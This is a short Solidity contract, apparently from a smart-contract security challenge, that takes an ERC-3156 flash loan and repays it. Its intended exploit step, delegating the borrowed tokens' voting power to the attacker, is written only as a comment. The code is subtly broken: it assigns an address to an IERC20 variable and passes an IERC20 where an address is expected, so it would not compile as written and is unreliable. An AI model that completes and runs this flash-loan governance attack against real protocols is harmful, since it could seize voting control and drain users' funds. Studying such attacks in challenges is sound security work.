// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {
    IERC3156FlashBorrower
} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {
    IERC3156FlashLender
} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract MalicousBorrower is IERC3156FlashBorrower {
    IERC3156FlashLender public immutable lender;
    IERC20 public immutable token;
    address public immutable player;

    constructor(address _lender, address _token) {
        lender = IERC3156FlashLender(_lender);
        token = _token;
        player = msg.sender;
    }

    function executeFlashLoan(uint256 amount) external {
        lender.flashLoan(this, token, amount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        //delegate voting power
        // token.delegate(player);
        // Must approve the lender to take the loan back.
        IERC20(tokenAddress).approve(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
